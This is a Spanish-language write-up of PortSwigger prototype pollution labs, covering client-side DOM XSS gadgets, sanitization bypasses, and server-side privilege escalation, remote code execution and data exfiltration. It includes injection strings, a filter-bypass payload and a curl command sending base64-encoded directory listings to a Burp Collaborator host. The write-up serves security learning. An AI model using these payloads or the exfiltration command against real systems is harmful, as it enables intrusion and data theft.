------

El ataque **Prototype Pollution** es una técnica de ataque que aprovecha las vulnerabilidades en la implementación de objetos en JavaScript. Esta técnica de ataque se utiliza para modificar la propiedad “**prototype**” de un objeto en una aplicación web, lo que puede permitir al atacante ejecutar código malicioso o manipular los datos de la aplicación.

En JavaScript, la propiedad “prototype” se utiliza para definir las propiedades y métodos de un objeto. Los atacantes pueden explotar esta característica de JavaScript para modificar las propiedades y métodos de un objeto y tomar el control de la aplicación.

El ataque de Prototype Pollution se produce cuando un atacante modifica la propiedad “prototype” de un objeto en una aplicación web. Esto se puede lograr mediante la manipulación de datos que se envían a través de formularios o solicitudes AJAX, o mediante la inserción de código malicioso en el código JavaScript de la aplicación.

Una vez que el objeto ha sido manipulado, el atacante puede ejecutar código malicioso en la aplicación, manipular los datos de la aplicación o tomar el control de la sesión de un usuario. Por ejemplo, un atacante podría modificar la propiedad “prototype” de un objeto de autenticación de usuario para permitir el acceso a una cuenta sin la necesidad de una contraseña.

El impacto de la explotación del ataque Prototype Pollution puede ser significativo, ya que los atacantes pueden tomar el control de la aplicación o comprometer los datos de los usuarios. Además, dado que el ataque se basa en vulnerabilidades en la implementación de objetos en JavaScript, puede ser difícil de detectar y corregir.

para comprender del todo, tenemos que entender que en JavaScript todo objeto creado por mas vacío que se encuentre hereda las conocidas propiedades del objeto, un ejemplo seria:

```js
Object.prototype.hacked = "hackeado"; //se agregar una nueva propiedad

const example = {}; // Objeto vacío que hereda propiedades de Object.prototype()

//Como hereda las propiedades de el objeto podemos directamente hacer un

console.log(example.hacked); // Podemos usar la propiedad hacked ya que la hereda.
```

El problema real de esto es cuando nosotros podemos inyectar desde fuera mediante post o cualquier otra vulnerabilidad propiedades con las cuales modificamos o alteramos la manera en la cual alteramos el flujo o contexto real de un prototipo o creamos nuevos.

## Lab: Client-side prototype pollution via browser APIs

Vamos a comenzar identificando la vulnerabilidad que es en la URL:

Una forma de verificar si en la url tenemos la posibilidad de inyectar prototipos es usando  `?__proto__[foo]=bar` al final de la misma, esto llega a ser interpretado por algunos frameworks como el `Object.prototype.foo = "bar"` lo que permite la inyeccion:

![[Pasted image 20260225155309.png]]

Ahora para comprobar si la inyección es valida es tan simple intentar desde la consola imprimir un objeto vacío como `console.log({}.foo);` y deberíamos ver  `bar`.

![[Pasted image 20260225155501.png]]

Ahora que confirmamos la vulnerabilidad y nuestro siguiente objetivo es encontrar el vector de ataque, en este caso vamos a revisar un script en especifico que carga la web:

![[Pasted image 20260225155809.png]]

me lo voy a llevar a local para analizarlo mejor:

![[Pasted image 20260225211227.png]]

Tenemos que fijarnos de forma muy atenta en el código, donde tenemos una función a sincrónica dentro de la cual definimos un objeto `config`,  este tiene dos propiedades que son `params` y `transport_url`. Podemos observar a continuación como se redefine una propiedad en especifico que es `transfer_url` donde vemos que `configurable: false` y `writable:false` nos define la propiedad como no configurarble y sin la capacidad de escritura a futuro para que no se pueda borrar ni sobrescribir.

Bueno fuera fácil si la propiedad se pudiera sobre escribir no asignar valor pero por su configuración no se puede, pero algo mas que tenemos que tener en cuenta es que JavaScript tiene funciones internas como `.value`  cuando en el código hace `script.src = config.transport_url` en realidad lo que hace por detrás es `config.transport_ulr.value` por lo que nosotros podríamos intentar sobrescribir esta propiedad para que retorne un valor especifico, por ejemplo lo siguiente:

![[Pasted image 20260225223018.png]]

Vemos que nos intenta la carga de un recurso `bar`, podemos intentar ver igual en el inspector si se inserto una etiqueta `script`:

![[Pasted image 20260225223101.png]]

Como podemos observar sí se inserto. Ahora directamente no podemos ingresar código JavaScript porque llega al `src` no a la etiqueta, pero podemos jugar con la propiedad de `data` esta es un propiedad muy usada para la representación de de imágenes en base64 donde su sintaxis es: `<img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQAB.." />`, ahora nosotros podemos aprovechar esto debido a que podemos separar el `mime-type`  sin definir por una coma y ejecutar instrucciones, quedando como `src="data:,alert(1)"`, esto ya nos permite ejecutar una alerta y lo hacemos de la siguiente manera en el laboratorio:

![[Pasted image 20260225223701.png]]

donde al enviarlo y recargar la web vemos la alerta:

![[Pasted image 20260225223730.png]]

y con esto el lab esta terminado.

![[Pasted image 20260225223750.png]]


## DOM XSS via client-side prototype pollution

Comenzamos primero viendo si mediante la url podemos envenenar el prototipo:

![[Pasted image 20260225224304.png]]

Como podemos observar si queda envenenado y pues tenemos el `prototype pollution`.

Ahora al igual que en otro laboratorio tenemos un código el cual saque y vamos a analizar:

![[Pasted image 20260225225118.png]]

![[Pasted image 20260225231317.png]]

Vemos que el código con el anterior laboratorio es prácticamente el mismo del anterior laboratorio donde su principal diferencia radica en el echo de que no define las reglas que nos impedían reescribir `transport_url` por lo tanto la inyección queda directamente en sobrescribir `transport_url` de la siguiente manera:

![[Pasted image 20260225232243.png]]

y ya si lo enviamos veremos la alerta:

![[Pasted image 20260225232302.png]]

Como podemos observar tenemos la alerta y con esto el laboratorio terminado:

![[Pasted image 20260225232416.png]]


## DOM XSS via an alternative prototype pollution vector

Lo primero es identificar si tenemos un `prototype pollution` mediante la url como ya conocemos:

![[Pasted image 20260225232757.png]]

se puede intentar listar igual `Object.prototype` para ver si encontramos `foo` pero tampoco tenemos respuesta:
![[Pasted image 20260225232942.png]]

Como podemos observar en este caso el vector usual no esta y tenemos que intentar con alternativas.

Vamos a intentar inyectarlo sin corchetes de la siguiente manera `?__proto__.foo=bar`:

![[Pasted image 20260225233213.png]]

Como podemos observar logramos inyectar ya dentro de prototipo a `foo`, esta es una alternativa funcional.

Ahora como es de costumbre descubrimos el código y lo llevamos a local para analizarlo mejor:

![[Pasted image 20260225233542.png]]

![[Pasted image 20260225233623.png]]

Algo que aquí resalta sobre todo es directamente el `eval`, recordemos que esa es una función vulnerable, así que primero analizamos eso y veamos si se puede hacer algo.

Si nos fijamos con atención dentro de `eval` tenemos un condicional donde primero verifica si `manager` existe y si `manager.sequence` existe, ahora si nos fijamos bien al definir `window.manager` mucho mas arriba vemos que no define nada de `sequence` por lo que en realidad no tiene nada, tenemos una parte donde su valor es asignado a la variable `a` en caso de existir y luego también se altera su valor sumando 1, pero nada mas.

En este punto al no estar definida podemos intentar definir `sequence` y directamente dar el valor de `alert(1)` donde para obtener el resultado `eval` lo ejecutara, vamos a intentarlo:

![[Pasted image 20260225235406.png]]

vemos que no funciona, pero al revisar la consola vemos ademas un error, podemos dar clic para que nos lleve a donde se efectua:

![[Pasted image 20260225235459.png]]

Nos llega al archivo que analizamos, vamos a poner un break point en la linea del `eval` para ver que sucede en ese punto y volver a cargar:

![[Pasted image 20260225235643.png]]

podemos observar que el valor del `alert(1)` si llega pero en la operatoria "punto 2" se le suma un `1` quedando `alert(1)1` donde no se evalúa correctamente. Con eso claro lo que podemos intentar hacer es jugar con operadores aritméticos como `-,*` el objetivo es que se analice independientemente el `alert(1)` y luego intente su resultado intente operar con el `1` pero primero lo evalúa, forzando su ejecución, vamos a intentarlo:

![[Pasted image 20260226000111.png]]

![[Pasted image 20260226000332.png]]

Bueno con esto terminamos el laboratorio:

![[Pasted image 20260226000349.png]]


## Client-side prototype pollution via flawed sanitization

Comenzamos como de costumbre intentado identificar donde y con que método podemos envenenar el `Object.prototype`.

![[Pasted image 20260226000931.png]]

![[Pasted image 20260226001011.png]]

Observamos que con ninguno de los métodos que ya conocemos no funciona.

Bueno no logramos encontrar el vector de inyección así que vamos a analizar un poco el código a ver que es lo que encontramos:

![[Pasted image 20260226001204.png]]

![[Pasted image 20260226001338.png]]

vemos que el código es el mismo del laboratorio `1` pero no logramos la contaminación del equipo y aquí esta el porque, si nos fijamos en la siguiente función tenemos la protección.

Al parecer en esta función compara los valores que se le pasa con una lista simple y corta donde si encuentra la entrada con lo que tiene en la lista, lo remplaza con nada para evitar una inyección.

Ahora el código solo verifica una sola vez, por lo que podemos intentar engañarlo definiendo `__pro__proto__to.foo=bar` donde al pasar por la función de protección va a eliminar el `__proto__` quedando en `__proto__.foo=bar` y como no verifica nuevamente pues lo deja pasar, vamos a intentarlo:

![[Pasted image 20260226002255.png]]

Como podemos observar, logramos la inyección de esta manera, en este punto ya solo es cuestión de realizar la inyección de la siguiente manera:

![[Pasted image 20260226002420.png]]

Si lo enviamos vamos a ver que ya nos genera la alerta:

![[Pasted image 20260226002451.png]]

Ya con esto terminamos el laboratorio.

![[Pasted image 20260226002513.png]]


## Client-side prototype pollution in third-party libraries

Bueno en esta máquina podemos identificar primero el punto de inyección y esto es cuestión de probar mediante diferentes los diferentes métodos y formas que si tiene, en este caso la inyección es la siguiente:

![[Pasted image 20260226191339.png]]

Como podemos observar ya tenemos el punto de inyección, en este caso lo que vamos a hacer es intentar encontrar un punto de inyección [[Cross-Site Scripting XSS]], para esto analizamos los scripts de la web en busca de fallos.

Mediante la documentación de Port Swigger tenemos una forma de intentar buscar de forma manual utilizando:

```js
Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
    get() {
        console.trace();
        return 'polluted';
    }
})
```

El proceso es el siguiente nosotros tenemos que probar de forma manual por diferentes tipos de peticiones pasándole una propiedad el objetivo es que si la propiedad que le pasamos es vulnerable invocamos al `getter` donde al mismo forzamos una salida por consola con el texto `polluted`, entonces lo primero es capturar la respuesta principal de la peticion orginal en el Burp Suite para manipularla:

![[Pasted image 20260226194134.png]]

ahora modificamos antes del primer script para lograr poner un `debugger` de la siguiente manera:

![[Pasted image 20260226194224.png]]

Esto lo vamos a enviar y veremos lo siguiente en el navegador:

![[Pasted image 20260226194304.png]]

Como observamos se paro la ejecución, el punto ahora es en la consola ir probando mediante el código proporcionado diferentes propiedades, el proceso es cansoso y repetitivo pero certero. 

Vamos a ver que al usar la propiedad `hitCallback`:

![[Pasted image 20260226194538.png]]

Tenemos que darle a play y veamos el resultado:
![[Pasted image 20260226194638.png]]

Vemos que en realidad se ejecuta el `trace` y también nos informa que `polluted` no esta definido y es lo que buscamos.

Vamos a revizar porque nos da el punto exacto del fallo para saber en donde lo ejecuta exactamente y como, el objetivo de saber es poder adaptar el código malicioso a como se esta interpretando.

![[Pasted image 20260226194939.png]]

Entendiendo un poco el código vemos que llega el objeto `a` a la función donde de este objeto se extrae el valor de `tc` mediante su  `getter` donde se almacena en la variable `c`, ahora esta variable llega a ser interpretada dentro de un `setTimeout` entiendo que el mismo lo evalúa y es allí donde podemos obtener la ejecución de código, vamos a intentar entonces directamente a `hitCallback` asignarle un `alert(1)` para ver si es valido:

![[Pasted image 20260226195522.png]]

Como podemos observar si es valido por lo que ahora tenemos que sacarle a cookie de sesión a la victima y para esto necesitamos hacer que esta ingrese directamente en la inyección, esto con el exploit server que nos preparan es mucho mas sencillo quedando de la siguiente manera:

![[Pasted image 20260226195735.png]]

almacenamos y enviamos a ver que obtenemos:

![[Pasted image 20260226195758.png]]

listo la maquina queda resuelta.


## Privilege escalation via server-side prototype pollution

En este laboratorio vamos a ver como es posible elevar el privilegio de un usuario.

Lo primero es entrar con el usuario que nos dan y vemos el siguiente panel:

![[{9B6CB500-35BF-483F-8BD4-56B4B17AC716}.png]]

Veamos como es que se tramitan estos datos al momento de enviarlos:

![[{475CD6BA-666A-4982-9714-55965998283A}.png]]

Observamos que la data se tramita por JSON, veamos la respuesta trabajando en el `repeater`:

![[Pasted image 20260226212957.png]]

Vemos muchos mas datos en la respuesta donde en realidad tenemos un `isAdmin`, quiero creer como verificador para el usuario en caso de ser `admin`.

Directamente no podemos afectarlo, pero mediante un truco o diferentes trucos esto es posible.

Nosotros solo podemos suponer el funcionamiento de las webs ya que no conocemos como estas construidas, por lo tanto lo que podemos imaginar por detrás de esta petición al llegar al servidor es que el mimos haga algo como:

```js
const body = JSON.parse(requestBody)
```

Lo que hace es convertir el texto en JSON que se le envia mediante la solicitud en un Objeto javascript para poder obtener los valores de cada uno, aquí es donde entra nuestro truco porque si esto es un objeto y es interpretado como tal podríamos enviar algo de la siguiente manera:

![[Pasted image 20260226213916.png]]

Lo que sucede es que no nos crea un objeto o propiedad `__proto__` sino que identifica que se quiere alterara los prototipos de `Object.prototype` por lo que crea o altera de forma interna, este es un punto de inyección.

Para comprobar podemos enviar esto y ver si en la respuesta lo representa:

![[Pasted image 20260226214142.png]]

Como podemos observar tenemos ya la nueva propiedad `foo` y como tal no se encuentra en el objeto, si no, dentro del prototipo pero el acceder es lo mismo.

Bueno  con esto ya en conocimiento podemos intentar alterar la propiedad de `isAdmin` claro esto no lo altera directamente sino que al asignarse en el prototipo se vuelve una propiedad heredada con un valor especifico por lo tanto podríamos llegar a alterarla de forma indirecta:

 ![[Pasted image 20260226214435.png]]

como podemos ver mediante la modificación del prototipo y porque la aplicación lo permite podemos llegar a alterar propiedades existentes.

![[Pasted image 20260226214544.png]]

Como vemos ya somos administradores y podemos terminar el laboratorio:

![[Pasted image 20260226214639.png]]


## Detecting server-side prototype pollution without polluted property reflection

Al igual que en el anterior laboratorio vamos a tener un apartado para enviar o actualizar datos lo que vamos a capturar directamente:

![[Pasted image 20260226220821.png]]

Observamos directamente la petición y la respuesta.

En este laboratorio no se nos pide escalar directamente a administrador si no, realizar un cambio sutil pero perceptible, para esto algo que podemos hacer es generar un error en el envío de datos para ver como responde ante esto el servidor:

![[Pasted image 20260226221134.png]]

El error es haber quitado una comilla y vemos que el servidor responde con el objeto `error`, el cual contiene varias propiedades, podemos intentar alterar en este caso la propiedad de `status`:

![[Pasted image 20260226221357.png]]

Directamente en la respuesta no vemos nada pero y si forzamos un error?

![[Pasted image 20260226221441.png]]

Como observamos logramos obligar al servidor a responder ante el error como `405` y no como `400` que era en un comienzo, por lo que si heredo la propiedad definida mediante la inyección del prototipo al `Object.prototipe`.

![[Pasted image 20260226221556.png]]


## Bypassing flawed input filters for server-side prototype pollution

El objetivo es sobrepasar filtros de entrada defectuosos para generar un `protoype pollutio` de lado del servidor.

comenzamos directo ya capturando la petición:

![[Pasted image 20260226221937.png]]

De la forma clásica como en anteriores laboratorios no vamos a lograr contaminar el prototipo.

Para este caso vamos a contaminar mediante la propiedad constructor con la sintaxis de la siguiente manera:

```JSON
{
    "constructor": {
        "prototype": {
            "foo": "bar",
            "json spaces": 10
        }
    }
}
```

Así que vamos a probarlo:

![[Pasted image 20260226222422.png]]

Podemos observar como se insertaron las propiedades que definimos, usualmente se usa `json spaces` para definir el valor del tabulador, en este caso no se aplica del todo pero es una forma de validar si se aplica la inyección.

Ya validado realicemos la inyección a `isAdmin`:

![[Pasted image 20260226222919.png]]

Vemos que la inyección es valida por lo cual vamos a completar el laboratorio eliminando al usuario `carlos`:

![[Pasted image 20260226223018.png]]

## Remote code execution via server-side prototype pollution

Bueno como ya se ha echo vamos directo a interceptar la petición y la respuesta para ver como se esta tramitando todo:

![[Pasted image 20260226223706.png]]

Vemos que directamente ya somos administrador, vamos a panel a ver que encontramos:

![[Pasted image 20260226223838.png]]

Vemos que podemos correr una serie de tareas de mantenimiento, veamos como es que esto se tramita:

![[Pasted image 20260226224050.png]]

Vemos que se realizan ciertas tareas tanto para la base de datos como para los archivos.

El objetivo primero seria ver si podemos realizar una inyección:

![[Pasted image 20260226224322.png]]

En la petición original si se realiza si problema la inyección.

Bueno tenemos que comprender ahora que vemos que es valida que cuando ejecutamos tareas de limpieza en el servidor usualmente y como buena practica en realidad se genera un proceso hijo para la ejecución de las tareas y como nos hablan de tener implementadas tecnologías como `node`, lo que puedo pensar es que se utilice módulos como `child_process.fork()` donde se genera el nuevo proceso hijo.

Ahora algo que tenemos que saber es que a este a este modulo se le pasa el recurso el script que ejecuta las tareas, algunos argumentos y generalmente las opciones, ahora aquí lo que sucede es que en las opciones se puede incorporar `execArg` donde se puede enviar una lista de `flags` al binario de `node` cuando lanza los proceso  y uno de estos comando que se pueden ejecutar es `--eval` mediante el cual se puede ejecutar comando.

Bueno una forma de jugar con eso seria de la siguiente manera:

![[Pasted image 20260226225643.png]]

Vamos a representarlo y dejarlo en la petición a ver si logramos algo:


![[Pasted image 20260226230051.png]]

En este punto ya contaminamos el el `Object.prototype` de forma global donde aquel objeto que no contenga la propiedad `execArgv`, la herede de forma contaminada, en este punto lo que vamos a hacer es ejecutar una limpieza:

![[Pasted image 20260226230233.png]]


## Exfiltrating sensitive data via server-side prototype pollution

Tenemos que lograr primero la inyección, una vez que tenemos esta lista tenemos que identificar el gadget con el cual vamos a trabajar y mediante el cual tenemos que obtener el contenido de `/hom/carlos` mediante una ejecución de comandos y obtener al final el contenido de un archivo secreto dentro de ese directorio.

Bueno es un laboratorio muy similar al anterior donde ya somos admin, tenemos los permisos de admin pero vamos a ver las dos peticiones, cuando enviamos datos y cuando realizamos la limpieza:

![[Pasted image 20260226230830.png]]

![[Pasted image 20260226230840.png]]

Vemos las dos peticiones simplemente igual al anterior laboratorio donde vamos directamente primero a intentar una inyección a ver si es valido:


![[Pasted image 20260226231020.png]]

vemos que tenemos la misma inyección por lo que siguiendo la misma lógica de la anterior máquina anterior. Ahora no vamos a lograr una conexión directa eso si por lo que mediante investigación a la funcion `execSync` obtenemos que podemos pasarle parámetros como `shell` e `input`, aquí esta el truco y es que `shell` admite `vim` el cual mediante el `:! <comado>` podemos nosotros ejecutar comandos por lo tanto usando estas dos entradas queda:

![[Pasted image 20260226232253.png]]

Ahora es cuestión de ejecutar la limpieza y ver si lográmos obtener algo dentro del Burp Collaborator:

![[Pasted image 20260226232417.png]]

como podemos observar si llego y es realizado mediante `curl`.

Ya con esto podemos vamos a provechar para ejecutar un comando de la siguiente manera:

```bash
ls -l /home/carlos | base64 | curl -d @- <burpCollaborator>
```

lo que hacemos en este punto es enviar la salida en `base64` del comando `ls /home/carlos` a nuestro Burp Collaborator:

![[Pasted image 20260226232820.png]]

como se observa envenenamos nuevamente y vamos a darle a la limpieza y veamos si funciona:

![[Pasted image 20260226232909.png]]

Pues al parecer esta funcionando `exelente`:

![[Pasted image 20260226232948.png]]

vemos el archivo secret, siguiendo el mismo concepto vamos a enviar el contenido de secret:

![[Pasted image 20260226233039.png]]

Ahora ya veamos si al ejecutar la limpieza nos llega el contenido:

![[Pasted image 20260226233126.png]]

Excelente, veamos el contenido:

![[Pasted image 20260226233228.png]]

pasemos esto al laboratorio y terminemos.

![[Pasted image 20260226233302.png]]